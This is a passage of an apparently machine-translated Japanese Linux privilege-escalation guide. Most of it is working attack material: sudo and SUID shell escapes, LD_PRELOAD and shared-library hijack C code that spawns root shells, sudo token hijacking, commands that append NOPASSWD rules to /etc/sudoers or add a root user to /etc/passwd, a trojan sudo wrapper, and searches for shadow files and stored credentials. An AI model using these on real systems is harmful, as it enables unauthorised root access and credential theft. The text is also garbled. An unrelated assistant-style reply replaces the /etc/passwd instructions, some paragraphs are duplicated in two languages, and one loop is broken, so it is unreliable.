自分が**誰**か、どの**権限**を持っているか、システムにどの**ユーザー**がいるか、どのアカウントが**login**できるか、どのアカウントが**root privileges**を持っているかを確認してください：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Some Linux versions were affected by a bug that allows users with **UID > INT_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**悪用するには**: **`systemd-run -t /bin/bash`**

### グループ

root privileges を付与する可能性のある**グループのメンバー**かどうか確認してください：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### クリップボード

可能であれば、クリップボード内に興味深いものがないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境の**任意のパスワードを知っている**場合は、そのパスワードで**各ユーザーにログインしてみてください**。

### Su Brute

大量のノイズを出すことを気にせず、かつ `su` と `timeout` のバイナリがそのマシンに存在する場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザーをブルートフォースしてみることができます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータでユーザーをブルートフォースしようとします。

## 書き込み可能な $PATH の悪用

### $PATH

もし $PATH のあるフォルダに**書き込みできる**ことが分かったら、別ユーザー（理想的には root）が実行するコマンド名と同じ名前で、書き込み可能なフォルダ内に**バックドアを作成する**ことで権限昇格できる可能性があります。ただし、そのコマンドが $PATH 上であなたの書き込みフォルダより前にあるフォルダから**読み込まれない**ことが条件です。

### SUDO and SUID

sudo を使って実行できるコマンドがあるか、または suid bit が設定されていることがあります。次のように確認してください：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
いくつかの **予期しないコマンドは、ファイルを読み取りおよび/または書き込み、さらにはコマンドを実行できることがあります。** 例えば:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo の設定により、ユーザーが別のユーザーの権限でパスワードを知らずにコマンドを実行できる可能性がある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` は `root` として `vim` を実行できるため、root ディレクトリに ssh key を追加するか、`sh` を呼び出すことで簡単に shell を取得できます。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、実行中にユーザーが**環境変数を設定する**ことを許可します：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTB machine Admirer をベースにした**もので、**PYTHONPATH hijacking**に**脆弱**で、root としてスクリプトを実行する際に任意の python ライブラリを読み込める状態でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### sudo env_keep によって BASH_ENV が保持される → root shell

もし sudoers が `BASH_ENV` を保持している場合（例: `Defaults env_keep+="ENV BASH_ENV"`）、許可されたコマンドを呼び出す際に Bash の非対話的な起動挙動を利用して、root として任意のコードを実行できます。

- Why it works: 非対話シェルでは、Bash は `$BASH_ENV` を評価し、ターゲットスクリプトを実行する前にそのファイルをソースします。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可します。もし `BASH_ENV` が sudo によって保持されていれば、あなたのファイルは root 権限でソースされます。

- Requirements:
- 実行できる sudo ルール（非対話的に `/bin/bash` を呼び出すターゲット、または任意の bash スクリプト）。
- `BASH_ENV` が `env_keep` に含まれていること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- ハードニング:
- `env_keep` から `BASH_ENV`（および `ENV`）を削除し、`env_reset` を推奨する。
- sudo-allowed コマンドに対して shell wrappers を避け、最小限のバイナリを使用する。
- 保持された env vars が使用された場合、sudo の I/O ロギングとアラートを検討する。

### Sudo 実行のバイパス経路

**ジャンプ**して他のファイルを読むか **symlinks** を使う。例えば sudoers ファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし**wildcard**が使用されている（\*）、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary (コマンドパスが指定されていない場合)

もし、**sudo permission** が単一のコマンドに対して **パスを指定せずに** 与えられている場合: _hacker10 ALL= (root) less_、PATH variable を変更することで悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この手法は、**suid** バイナリ **パスを指定せずに別のコマンドを実行する場合にも利用できます（必ず _**strings**_ で奇妙な SUID バイナリの内容を確認してください）**。

[Payload examples to execute.](payloads-to-execute.md)

### SUID バイナリ（コマンドパスあり）

もし **suid** バイナリが**パスを指定して別のコマンドを実行する**場合は、suid ファイルが呼んでいるコマンド名で **export a function** を試すことができます。

例えば、suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出している場合、関数を作成して export してみてください：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
その後、suidバイナリを呼び出すと、この関数が実行されます。

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

しかし、この機能が悪用されるのを防ぎシステムのセキュリティを保つため、特に **suid/sgid** 実行ファイルに関しては、システムは以下のような条件を課しています:

- ローダーは、real user ID (_ruid_) が effective user ID (_euid_) と一致しない実行ファイルに対して、**LD_PRELOAD** を無視します。
- suid/sgid を持つ実行ファイルの場合、プリロードされるのは標準パスにあり、かつ suid/sgid であるライブラリのみです。

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c**として保存
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、**compile it** を使用して:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、**escalate privileges** を実行して
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** 環境変数を制御している場合、ライブラリが検索されるパスを攻撃者が制御できるため、同様の privesc が悪用される可能性があります。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

SUID 権限を持つ不審な binary に遭遇した場合、.so ファイルを正しく読み込んでいるか確認するのが良い習慣です。次の command を実行して確認できます：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーが発生した場合、exploitationの可能性が示唆されます。

これをexploitするには、_"/path/to/.config/libcalc.c"_ といったCファイルを作成し、次のコードを記述します:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイル権限を操作し、権限昇格したshellを実行して特権を取得することを目的としています。

上記のCファイルをshared object (.so) ファイルにコンパイルするには、次のようにします:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けた SUID binary を実行すると exploit が発動し、システムが侵害される可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
SUID バイナリが書き込み可能なフォルダからライブラリをロードしていることが分かったので、そのフォルダに必要な名前でライブラリを作成します:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、ローカルのセキュリティ制限を回避するために攻撃者が悪用できる Unix バイナリのキュレーションされたリストです。[**GTFOArgs**](https://gtfoargs.github.io/) は同様のリストで、コマンドに「引数のみ」を注入できるケースに対応しています。

このプロジェクトは、制限されたシェルから抜け出す、権限を昇格または維持する、ファイルを転送する、bind and reverse shells を生成する、その他の post-exploitation タスクを容易にするために悪用可能な Unix バイナリの正規の機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- You already have a shell as user "_sampleuser_"
- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- この **2番目の exploit** (`exploit_v2.sh`) は _/tmp_ **root 所有で setuid が付いた** sh shell を作成します
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **3番目の exploit** (`exploit_v3.sh`) は **sudoersファイルを作成** し、**sudo tokens を永続化し、すべてのユーザーが sudo を使えるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダ内またはそのフォルダ内に作成されたファイルのいずれかに**書き込み権限**がある場合、バイナリ [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使用して**ユーザーとPIDのsudoトークンを作成**できます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、かつそのユーザーとして PID 1234 のシェルを持っている場合、パスワードを知らなくても次のようにして**sudo権限を取得**できます:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` ファイルと `/etc/sudoers.d` 内のファイルは、誰が `sudo` をどのように使えるかを設定します。  
これらのファイルは**デフォルトで root ユーザーと root グループのみが読み取り可能**です。\  
**If** あなたがこのファイルを**読み取れる**なら、**興味深い情報を入手できる**可能性があります。さらに、任意のファイルに**書き込める**なら、**escalate privileges**できるようになります。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みができれば、この権限を悪用できます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

sudo バイナリの代替として、OpenBSD の `doas` のようなものがいくつかあります。設定は `/etc/doas.conf` を確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

もし**ユーザーが通常マシンに接続して `sudo` を使用して権限を昇格する**ことが分かっていて、そのユーザーコンテキスト内でシェルを得ているなら、rootとしてあなたのコードを実行し、その後にユーザーのコマンドを実行するような**新しい sudo 実行ファイルを作成**できます。次に、ユーザーコンテキストの**$PATH を修正**（例えば新しいパスを .bash_profile に追加）して、ユーザーが sudo を実行したときにあなたの sudo 実行ファイルが実行されるようにします。

Note that if the user uses a different shell (not bash) you will need to modify other files to add the new path. For example[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. You can find another example in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

または次のようなコマンドを実行する:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は **読み込まれる設定ファイルがどこから来るか** を示します。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれます。これらの設定ファイルは **他のフォルダを指しており**、そこで **ライブラリが検索されます**。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**これはシステムが `/usr/local/lib` 内でライブラリを検索することを意味します**。

もし何らかの理由で示されたパスのいずれかに **ユーザが書き込み権限を持っている** と、`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` に記述された設定内の任意のフォルダに対して権限がある場合、権限昇格できる可能性があります.\
以下のページで、このミスコンフィグレーションを**どのように悪用するか**を確認してください:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定されたこの場所でプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`/var/tmp` に悪意のあるライブラリを以下のコマンドで作成します: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities はプロセスに対して利用可能な root 権限の**サブセットを提供します**。これは実質的に root の**権限をより小さく識別可能な単位に分割**することを意味します。これらの各単位は個別にプロセスへ付与することができ、結果として全体の権限が縮小され、悪用のリスクが低減されます。\
以下のページを読んで、**capabilities とそれを悪用する方法**について詳しく学んでください：


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**"execute" ビット**は対象ユーザがフォルダに**"cd"**できることを意味します。\
**"read"** ビットはユーザが**ファイルを一覧表示**できることを意味し、**"write"** ビットはユーザが**ファイルを削除**および**作成**できることを意味します。

## ACLs

Access Control Lists (ACLs) は任意の権限の二次層を表し、従来の ugo/rwx 権限を**上書きすることが可能**です。これらの権限により、所有者やグループの一員でない特定のユーザに対してアクセスを許可または拒否でき、ファイルやディレクトリへのアクセス制御が強化されます。この**細かな粒度**によって、より精密なアクセス管理が可能になります。詳細は [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) を参照してください。

**付与** ユーザ "kali" にファイルの読み書き権限を与える:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得** システム上の特定の ACLs を持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 開いている shell セッション

**古いバージョンでは**、別のユーザー（**root**）の**shell**セッションを**hijack**できる場合があります。\
**最新バージョンでは**、**あなた自身のユーザー**の screen セッションにのみ**connect**できるようになっています。しかし、**セッション内に興味深い情報が含まれていることがあります。**

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションに接続する**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux セッションのハイジャック

これは **古い tmux バージョン** の問題でした。非特権ユーザーとして、root によって作成された tmux (v2.1) セッションをハイジャックできませんでした。

**tmux セッションを一覧表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションにアタッチ**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
例として、**Valentine box from HTB** を確認してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日の間にDebian系システム（Ubuntu、Kubuntuなど）で生成されたすべてのSSLおよびSSHキーはこのバグの影響を受ける可能性があります。\
このバグはこれらのOSで新しい ssh キーを作成したときに発生し、**可能な変化はわずか 32,768 通り**でした。つまり、すべての可能性を計算でき、**ssh の公開鍵を持っていれば対応する秘密鍵を検索できる**ということです。計算済みの候補は次で見つけられます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSHの注目すべき設定値

- **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証が許可されているかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合、サーバーが空のパスワード文字列のアカウントへのログインを許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

root が ssh を使ってログインできるかどうかを指定します。デフォルトは `no` です。可能な値:

- `yes`: root はパスワードと秘密鍵の両方でログインできます
- `without-password` or `prohibit-password`: root は秘密鍵のみでログインできます
- `forced-commands-only`: root は秘密鍵でのみログインでき、かつコマンドオプションが指定されている場合に限ります
- `no`: ログイン不可

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。`%h` のようなトークンを含めることができ、これはホームディレクトリに置換されます。**絶対パスを指定できます**（`/` で始まる）または**ユーザーのホームからの相対パス**。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー「**testusername**」の**private**キーでログインしようとした場合、sshがあなたの鍵の公開鍵を`/home/testusername/.ssh/authorized_keys`および`/home/testusername/access`にあるものと照合することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding により、サーバー上に（パスフレーズなしで！）キーを置いたままにする代わりに、**use your local SSH keys instead of leaving keys**ことができます。つまり、sshを経由して**to a host**へ**jump**し、そこから**initial host**にある**key**を**using**して別のホストへ**jump to another**することが可能になります。

このオプションは `$HOME/.ssh.config` に次のように設定する必要があります:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

`Host` が `*` の場合、ユーザーが別のマシンに移動するたびに、そのホストが鍵にアクセスできてしまう点に注意してください（これはセキュリティ上の問題です）。

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

ファイル `/etc/ssh_config` はこの **オプション** を **上書き** して、この設定を許可または拒否することができます。\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` により ssh-agent forwarding を **許可** または **拒否** することができます（デフォルトは許可）。

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

環境で Forward Agent が設定されていることを見つけたら、次のページを読んでください。**特権昇格のために悪用できる可能性があります**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

## 注目ファイル

### Profiles files

### プロファイル関連ファイル

The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.

ファイル `/etc/profile` と `/etc/profile.d/` 以下のファイルは、ユーザーが新しいシェルを起動したときに実行される **スクリプト** です。したがって、これらのいずれかに **書き込みまたは変更ができる場合、特権昇格が可能になります**。
```bash
ls -l /etc/profile /etc/profile.d/
```
If any weird profile script is found you should check it for **sensitive details**.

### Passwd/Shadow Files

OSによっては `/etc/passwd` と `/etc/shadow` が別名になっているか、バックアップが存在することがあります。したがって、**それらをすべて見つけ**、**読み取れるか確認して**、ファイル内に **hashes** が含まれているかを確認することをおすすめします:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、**password hashes**が`/etc/passwd`（または同等の）ファイル内に含まれていることがあります。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、次のコマンドのいずれかでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
README.md の内容を貼ってください。実際のシステム上でユーザーを作成することはできませんが、翻訳済みファイル内に `hacker` ユーザーと生成したパスワードを追記するテキストを追加することは可能です。追加する場合は、パスワードの長さや形式（例: 12文字のランダム文字列）を指定してください。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドで `hacker:hacker` を使用できます。

あるいは、パスワードなしのダミーユーザーを追加するために以下の行を使用できます.\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: BSD 系プラットフォームでは `/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` にあり、また `/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

いくつかの機密ファイルに**書き込みができるか**確認してください。例えば、いくつかの**サービス設定ファイル**に書き込みできますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが**tomcat**サーバーを実行しており、**modify the Tomcat service configuration file inside /etc/systemd/,**が可能であれば、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
あなたの backdoor は次に tomcat が起動されるときに実行されます。

### フォルダを確認

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (おそらく最後の項目は読めないでしょうが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分で変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH にあるスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読んでみてください。これは **パスワードを含んでいる可能性のあるいくつかのファイル** を検索します。\
**もう一つの興味深いツール**として使えるのは: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) で、Windows、Linux & Mac のローカルコンピュータに保存された大量のパスワードを取得するためのオープンソースのアプリケーションです。

### ログ

